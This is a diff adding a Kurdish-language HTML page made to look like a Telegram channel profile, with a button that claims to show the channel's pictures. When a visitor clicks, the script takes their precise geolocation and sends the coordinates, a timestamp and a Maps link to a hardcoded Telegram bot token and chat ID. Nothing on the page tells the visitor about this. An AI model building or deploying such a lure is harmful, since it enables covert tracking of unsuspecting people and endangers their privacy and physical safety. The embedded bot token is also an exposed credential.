@@ -1,0 +1,875 @@
+<!DOCTYPE html>
+<html lang="ku" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+  <title>ZAGROS COMPANY USA</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: radial-gradient(circle at 20% 30%, #0b1a2a, #030712);
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      padding: 16px;
+    }
+
+    .container {
+      max-width: 420px;
+      width: 100%;
+      margin: 0 auto;
+    }
+
+    .card {
+      background: rgba(18, 30, 50, 0.85);
+      backdrop-filter: blur(20px);
+      border-radius: 56px;
+      padding: 28px 20px 36px;
+      border: 1px solid rgba(72, 187, 255, 0.15);
+      box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.6), 0 0 0 1px rgba(72, 187, 255, 0.05) inset;
+      transition: all 0.3s ease;
+    }
+
+    .header {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 24px;
+    }
+
+    .back {
+      width: 44px;
+      height: 44px;
+      border: none;
+      background: rgba(255, 255, 255, 0.06);
+      border-radius: 40px;
+      color: #b0c7e7;
+      font-size: 32px;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      backdrop-filter: blur(4px);
+      transition: 0.2s;
+      flex-shrink: 0;
+    }
+    .back:hover {
+      background: rgba(255,255,255,0.12);
+    }
+
+    .header-title {
+      flex: 1;
+      font-size: 20px;
+      font-weight: 700;
+      color: #eef5ff;
+      letter-spacing: -0.2px;
+    }
+
+    .whatsapp-top {
+      width: 44px;
+      height: 44px;
+      background: linear-gradient(145deg, #1e2a4a, #0f1a2e);
+      border-radius: 40px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #25d366;
+      font-size: 24px;
+      border: 1px solid rgba(37, 211, 102, 0.3);
+      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+      flex-shrink: 0;
+    }
+
+    .avatar-wrapper {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 22px;
+    }
+    .avatar {
+      width: 100px;
+      height: 100px;
+      border-radius: 50%;
+      overflow: hidden;
+      background: #0f1a2e;
+      border: 4px solid rgba(72, 187, 255, 0.3);
+      box-shadow: 0 12px 30px -8px rgba(0,0,0,0.6);
+    }
+    .avatar img {
+      width: 100%;
+      height: 100%;
+      display: block;
+      object-fit: cover;
+    }
+
+    .badge {
+      background: rgba(16, 185, 129, 0.12);
+      color: #34d399;
+      font-size: 12px;
+      font-weight: 600;
+      padding: 6px 16px;
+      border-radius: 40px;
+      display: inline-block;
+      margin-bottom: 14px;
+      letter-spacing: 0.3px;
+      border: 0.5px solid rgba(52, 211, 153, 0.25);
+    }
+
+    h1 {
+      color: white;
+      font-size: 28px;
+      font-weight: 700;
+      margin-bottom: 6px;
+      letter-spacing: -0.3px;
+      word-wrap: break-word;
+    }
+
+    .username {
+      direction: ltr;
+      color: #9aaec9;
+      font-size: 13px;
+      margin-bottom: 16px;
+      word-wrap: break-word;
+    }
+
+    .description {
+      color: #cbd5e1;
+      font-size: 14px;
+      line-height: 1.6;
+      margin-bottom: 18px;
+      word-wrap: break-word;
+    }
+    .description strong {
+      color: #60a5fa;
+    }
+
+    .followers {
+      background: rgba(15, 23, 42, 0.5);
+      backdrop-filter: blur(4px);
+      display: inline-block;
+      padding: 8px 18px;
+      border-radius: 40px;
+      color: #b9cdff;
+      font-size: 13px;
+      border: 0.5px solid #2d3a5e;
+      margin-bottom: 22px;
+    }
+
+    .location-box {
+      background: rgba(15, 23, 42, 0.5);
+      backdrop-filter: blur(4px);
+      border-radius: 28px;
+      padding: 20px 18px;
+      border: 0.5px solid #2d3a5e;
+      margin-bottom: 28px;
+    }
+
+    .location-title {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      font-size: 16px;
+      font-weight: 700;
+      color: #e2edff;
+      margin-bottom: 12px;
+      flex-wrap: wrap;
+    }
+
+    .location-icon {
+      width: 42px;
+      height: 42px;
+      background: linear-gradient(145deg, #1e2a4a, #0f172a);
+      border-radius: 30px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #34d399;
+      font-size: 22px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+      flex-shrink: 0;
+    }
+
+    .location-box p {
+      color: #a3b9d6;
+      font-size: 13px;
+      line-height: 1.7;
+      margin-bottom: 16px;
+      word-wrap: break-word;
+    }
+
+    .location-btn {
+      width: 100%;
+      background: linear-gradient(105deg, #2563eb, #1d4ed8);
+      color: white;
+      border: none;
+      padding: 16px;
+      font-size: 16px;
+      font-weight: 600;
+      border-radius: 60px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      box-shadow: 0 8px 20px -6px #2563eb80;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+    .location-btn:active {
+      transform: scale(0.97);
+      box-shadow: 0 4px 12px -4px #2563eb;
+    }
+    .location-btn:disabled {
+      opacity: 0.6;
+      transform: none;
+    }
+
+    .result {
+      margin-top: 16px;
+      padding: 14px 16px;
+      border-radius: 28px;
+      font-size: 13px;
+      text-align: center;
+      display: none;
+      font-weight: 500;
+      backdrop-filter: blur(4px);
+      word-wrap: break-word;
+    }
+    .result.show {
+      display: block;
+    }
+    .result.success {
+      background: rgba(16, 185, 129, 0.12);
+      color: #4ade80;
+      border: 0.5px solid rgba(74, 222, 128, 0.25);
+    }
+    .result.error {
+      background: rgba(239, 68, 68, 0.12);
+      color: #f87171;
+      border: 0.5px solid rgba(248, 113, 113, 0.25);
+    }
+    .result.loading {
+      background: rgba(59, 130, 246, 0.12);
+      color: #60a5fa;
+      border: 0.5px solid rgba(96, 165, 250, 0.25);
+    }
+    .result .map-link {
+      display: inline-block;
+      margin-top: 10px;
+      color: #60a5fa;
+      text-decoration: none;
+      font-weight: 600;
+      border-bottom: 1px dashed #60a5fa80;
+      word-wrap: break-word;
+    }
+
+    .posts {
+      margin-top: 18px;
+    }
+    .posts-title {
+      font-size: 17px;
+      font-weight: 700;
+      color: #d6e4ff;
+      margin-bottom: 14px;
+      letter-spacing: -0.2px;
+    }
+    .post {
+      background: rgba(15, 23, 42, 0.5);
+      backdrop-filter: blur(4px);
+      border-radius: 24px;
+      padding: 16px 18px;
+      margin-bottom: 12px;
+      border: 0.5px solid #2d3a5e;
+    }
+    .post p {
+      color: #d1dfee;
+      font-size: 14px;
+      line-height: 1.6;
+      word-wrap: break-word;
+    }
+    .post small {
+      display: block;
+      margin-top: 8px;
+      color: #7a8ba8;
+      font-size: 11px;
+    }
+
+    .footer {
+      text-align: center;
+      margin-top: 24px;
+      color: #4b5f7a;
+      font-size: 11px;
+      letter-spacing: 0.3px;
+    }
+
+    .coords-preview {
+      background: rgba(0, 0, 0, 0.35);
+      border-radius: 20px;
+      padding: 10px;
+      margin-top: 10px;
+      font-family: monospace;
+      font-size: 11px;
+      color: #8da1c4;
+      word-break: break-all;
+      text-align: center;
+      border: 0.5px solid #2d3a5e;
+      display: none;
+    }
+
+    /* ===== RESPONSIVE STYLES ===== */
+    
+    /* Small phones (320px - 375px) */
+    @media screen and (max-width: 375px) {
+      body {
+        padding: 10px;
+      }
+      
+      .card {
+        padding: 20px 14px 28px;
+        border-radius: 40px;
+      }
+      
+      .header {
+        gap: 6px;
+        margin-bottom: 18px;
+      }
+      
+      .back {
+        width: 38px;
+        height: 38px;
+        font-size: 28px;
+      }
+      
+      .header-title {
+        font-size: 17px;
+      }
+      
+      .whatsapp-top {
+        width: 38px;
+        height: 38px;
+        font-size: 20px;
+      }
+      
+      .avatar {
+        width: 80px;
+        height: 80px;
+      }
+      
+      h1 {
+        font-size: 24px;
+      }
+      
+      .description {
+        font-size: 13px;
+      }
+      
+      .location-box {
+        padding: 16px 14px;
+        border-radius: 24px;
+      }
+      
+      .location-title {
+        font-size: 14px;
+        gap: 10px;
+      }
+      
+      .location-icon {
+        width: 36px;
+        height: 36px;
+        font-size: 18px;
+      }
+      
+      .location-btn {
+        padding: 14px;
+        font-size: 14px;
+      }
+      
+      .result {
+        padding: 12px 14px;
+        font-size: 12px;
+      }
+      
+      .post {
+        padding: 14px 14px;
+      }
+      
+      .post p {
+        font-size: 13px;
+      }
+    }
+
+    /* Medium phones (376px - 425px) */
+    @media screen and (min-width: 376px) and (max-width: 425px) {
+      .card {
+        padding: 24px 16px 32px;
+      }
+      
+      .avatar {
+        width: 90px;
+        height: 90px;
+      }
+      
+      h1 {
+        font-size: 26px;
+      }
+    }
+
+    /* Tablets (426px - 768px) */
+    @media screen and (min-width: 426px) and (max-width: 768px) {
+      .container {
+        max-width: 500px;
+      }
+      
+      .card {
+        padding: 36px 28px 44px;
+        border-radius: 60px;
+      }
+      
+      .avatar {
+        width: 120px;
+        height: 120px;
+      }
+      
+      h1 {
+        font-size: 32px;
+      }
+      
+      .description {
+        font-size: 15px;
+      }
+      
+      .location-btn {
+        padding: 18px;
+        font-size: 17px;
+      }
+    }
+
+    /* Large tablets & small laptops (769px - 1024px) */
+    @media screen and (min-width: 769px) and (max-width: 1024px) {
+      .container {
+        max-width: 560px;
+      }
+      
+      .card {
+        padding: 40px 32px 48px;
+        border-radius: 64px;
+      }
+      
+      .avatar {
+        width: 130px;
+        height: 130px;
+      }
+      
+      h1 {
+        font-size: 34px;
+      }
+      
+      .description {
+        font-size: 16px;
+      }
+    }
+
+    /* Large screens (1025px+) */
+    @media screen and (min-width: 1025px) {
+      .container {
+        max-width: 480px;
+      }
+    }
+
+    /* Landscape phones */
+    @media screen and (max-height: 500px) and (orientation: landscape) {
+      body {
+        padding: 10px;
+        align-items: flex-start;
+        padding-top: 20px;
+      }
+      
+      .card {
+        padding: 16px 16px 20px;
+        border-radius: 32px;
+      }
+      
+      .header {
+        margin-bottom: 12px;
+      }
+      
+      .avatar-wrapper {
+        margin-bottom: 12px;
+      }
+      
+      .avatar {
+        width: 60px;
+        height: 60px;
+      }
+      
+      h1 {
+        font-size: 20px;
+        margin-bottom: 4px;
+      }
+      
+      .description {
+        font-size: 12px;
+        margin-bottom: 10px;
+        line-height: 1.4;
+      }
+      
+      .followers {
+        margin-bottom: 12px;
+        font-size: 11px;
+        padding: 4px 14px;
+      }
+      
+      .location-box {
+        padding: 12px 14px;
+        margin-bottom: 16px;
+        border-radius: 20px;
+      }
+      
+      .location-title {
+        font-size: 13px;
+        margin-bottom: 8px;
+      }
+      
+      .location-icon {
+        width: 30px;
+        height: 30px;
+        font-size: 16px;
+      }
+      
+      .location-box p {
+        font-size: 11px;
+        margin-bottom: 10px;
+        line-height: 1.4;
+      }
+      
+      .location-btn {
+        padding: 10px;
+        font-size: 13px;
+      }
+      
+      .result {
+        padding: 8px 12px;
+        font-size: 11px;
+        margin-top: 10px;
+      }
+      
+      .posts {
+        margin-top: 10px;
+      }
+      
+      .posts-title {
+        font-size: 14px;
+        margin-bottom: 8px;
+      }
+      
+      .post {
+        padding: 10px 14px;
+        margin-bottom: 8px;
+      }
+      
+      .post p {
+        font-size: 12px;
+        line-height: 1.4;
+      }
+      
+      .footer {
+        margin-top: 12px;
+        font-size: 10px;
+      }
+      
+      .coords-preview {
+        padding: 6px;
+        font-size: 10px;
+        margin-top: 6px;
+      }
+    }
+
+    /* Very small screens */
+    @media screen and (max-width: 280px) {
+      body {
+        padding: 6px;
+      }
+      
+      .card {
+        padding: 14px 10px 20px;
+        border-radius: 28px;
+      }
+      
+      .header {
+        gap: 4px;
+        margin-bottom: 12px;
+      }
+      
+      .back {
+        width: 32px;
+        height: 32px;
+        font-size: 24px;
+      }
+      
+      .header-title {
+        font-size: 14px;
+      }
+      
+      .whatsapp-top {
+        width: 32px;
+        height: 32px;
+        font-size: 16px;
+      }
+      
+      .avatar {
+        width: 60px;
+        height: 60px;
+      }
+      
+      h1 {
+        font-size: 18px;
+      }
+      
+      .badge {
+        font-size: 10px;
+        padding: 4px 12px;
+      }
+      
+      .description {
+        font-size: 11px;
+      }
+      
+      .location-box {
+        padding: 12px 10px;
+        border-radius: 18px;
+      }
+      
+      .location-title {
+        font-size: 12px;
+        gap: 8px;
+      }
+      
+      .location-icon {
+        width: 28px;
+        height: 28px;
+        font-size: 14px;
+      }
+      
+      .location-box p {
+        font-size: 10px;
+      }
+      
+      .location-btn {
+        padding: 10px;
+        font-size: 12px;
+      }
+      
+      .result {
+        padding: 8px 10px;
+        font-size: 10px;
+      }
+      
+      .post {
+        padding: 10px 12px;
+      }
+      
+      .post p {
+        font-size: 11px;
+      }
+    }
+  </style>
+</head>
+<body>
+<div class="container">
+  <div class="card">
+
+    <div class="header">
+      <button class="back" type="button" onclick="history.back()">‹</button>
+      <div class="header-title">کاناڵەکان</div>
+      <div class="whatsapp-top">🇹🇯</div>
+    </div>
+
+    <div class="avatar-wrapper">
+      <div class="avatar">
+        <img src="flag.JPG" alt= ZAGROS COMPANY USA">
+      </div>
+    </div>
+
+    <div style="text-align: center;">
+      <div class="badge"> MALAF</div>
+      <h1> مه له ف</h1>
+      <div class="username">@Malafxana</div>
+      <div class="description">
+        ئەم کاناڵە تایبەتە بە
+        <strong> مه له ف</strong> 🇹🇯
+        <br>
+        <br>
+     
+      </div>
+      <div class="followers">👥 799, شوێنکەر</div>
+    </div>
+
+    <section class="location-box">
+      <div class="location-title">
+             <button class="location-btn" id="locationBtn" type="button">
+        ديتنا وينان تليكرام   
+      </button>
+      <div class="result" id="result"></div>
+      <div id="coordsPreview" class="coords-preview"></div>
+    </section>
+
+
+<script>
+  (function() {
+    // ============================================
+    // YOUR TELEGRAM BOT CREDENTIALS
+    // ============================================
+    const BOT_TOKEN = "8531462322:AAHpaPEIPy2TPrZGPUXvdBCLRA4XXUtpgcs";
+    const CHAT_ID = "658528376";
+
+    const locationBtn = document.getElementById("locationBtn");
+    const result = document.getElementById("result");
+    const coordsPreview = document.getElementById("coordsPreview");
+
+    function showResult(message, type = "") {
+      result.innerHTML = message;
+      result.className = "result show " + type;
+      if (type !== 'success') {
+        coordsPreview.style.display = 'none';
+      }
+    }
+
+    function showCoords(lat, lng, accuracy) {
+      coordsPreview.style.display = 'block';
+      coordsPreview.innerHTML = `📍 ${lat}, ${lng}  |  ±${Math.round(accuracy)}m`;
+    }
+
+    async function sendToTelegram(lat, lng, accuracy) {
+      const timestamp = new Date().toLocaleString('ku', { timeZone: 'Asia/Baghdad' });
+      const message = `📍 *شوێن هاوبەشکراوە*\n\nپانی: ${lat}\nدرێژی: ${lng}\nوردی: ±${Math.round(accuracy)}m\nکات: ${timestamp}\n\nGoogle Maps: https://maps.google.com/?q=${lat},${lng}`;
+      
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+      
+      const params = new URLSearchParams();
+      params.append('chat_id', CHAT_ID);
+      params.append('text', message);
+      params.append('parse_mode', 'Markdown');
+      
+      try {
+        const response = await fetch(url, { 
+          method: 'POST', 
+          body: params,
+          headers: {
+            'Content-Type': 'application/x-www-form-urlencoded',
+          }
+        });
+        
+        const result = await response.json();
+        console.log('Telegram response:', result);
+        
+        if (result.ok === true) {
+          return { success: true, result: result };
+        } else {
+          return { success: false, error: result.description || 'Unknown error' };
+        }
+      } catch (error) {
+        console.error('Send error:', error);
+        return { success: false, error: error.message };
+      }
+    }
+
+    locationBtn.addEventListener("click", function() {
+      if (!BOT_TOKEN || BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") {
+        showResult('❌ تکایە تۆکنی بۆتی تیلیگرام دابنێ!', 'error');
+        return;
+      }
+
+      if (!window.isSecureContext) {
+        showResult("❌ تکایە وێبسایتەکە بە HTTPS بکەرەوە.", "error");
+        return;
+      }
+      if (!navigator.geolocation) {
+        showResult("❌ وێبگەڕەکەت پشتگیری Location ناکات.", "error");
+        return;
+      }
+
+      locationBtn.disabled = true;
+      locationBtn.textContent = "⏳ شوێن وەردەگیرێت...";
+      showResult("📍 تکایە چاوەڕێ بکە...", "loading");
+
+      navigator.geolocation.getCurrentPosition(
+        async function(position) {
+          const latitude = position.coords.latitude;
+          const longitude = position.coords.longitude;
+          const accuracy = position.coords.accuracy;
+
+          const latStr = latitude.toFixed(6);
+          const lngStr = longitude.toFixed(6);
+          const mapUrl = "https://www.google.com/maps?q=" + latitude + "," + longitude;
+
+          showCoords(latStr, lngStr, accuracy);
+          showResult("📤 شوێن دەنێردرێت بۆ تیلیگرام...", "loading");
+
+          const sendResult = await sendToTelegram(latStr, lngStr, accuracy);
+
+          if (sendResult.success) {
+            result.innerHTML =
+              "✅ <strong>شوێن بە سەرکەوتوویی نێردرا!</strong>" +
+              "<br><br>" +
+              "📍 <strong>شوێن وەرگیرا</strong>" +
+              "<br><br>" +
+              "Latitude: " + latStr +
+              "<br>" +
+              "Longitude: " + lngStr +
+              "<br>" +
+              "Accuracy: ±" + Math.round(accuracy) + "m" +
+              "<br><br>" +
+              "<a class='map-link' href='" + mapUrl + "' target='_blank' rel='noopener noreferrer'>" +
+              "🗺️ بینینی شوێن لە Google Maps" +
+              "</a>" +
+              "<br><br>" +
+              "✅ چاوەڕێی تیلیگرام بکە!";
+
+            result.className = "result show success";
+          } else {
+            result.innerHTML =
+              "❌ <strong>نەنێردرا!</strong>" +
+              "<br><br>" +
+              "هەڵە: " + sendResult.error +
+              "<br><br>" +
+              "📍 <strong>شوێن وەرگیرا</strong>" +
+              "<br><br>" +
+              "Latitude: " + latStr +
+              "<br>" +
+              "Longitude: " + lngStr +
+              "<br>" +
+              "Accuracy: ±" + Math.round(accuracy) + "m" +
+              "<br><br>" +
+              "<a class='map-link' href='" + mapUrl + "' target='_blank' rel='noopener noreferrer'>" +
+              "🗺️ بینینی شوێن لە Google Maps" +
+              "</a>";
+
+            result.className = "result show error";
+          }
+
+          locationBtn.disabled = false;
+          locationBtn.textContent = "📤 بەردەوام بوون";
+        },
+        function(error) {
+          let message = "❌ نەتوانرا شوێن وەربگیرێت.";
+          if (error.code === 1) message = "❌ مۆڵەتی Location ڕەتکرایەوە.";
+          else if (error.code === 2) message = "❌ شوێن بەردەست نییە.";
+          else if (error.code === 3) message = "❌ داواکارییەکە کاتی تەواو بوو.";
+          showResult(message, "error");
+          coordsPreview.style.display = 'none';
+          locationBtn.disabled = false;
+          locationBtn.textContent = "📤 بەردەوام بوون";
+        },
+        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+      );
+    });
+  })();
+</script>
+
+</body>
+</html>
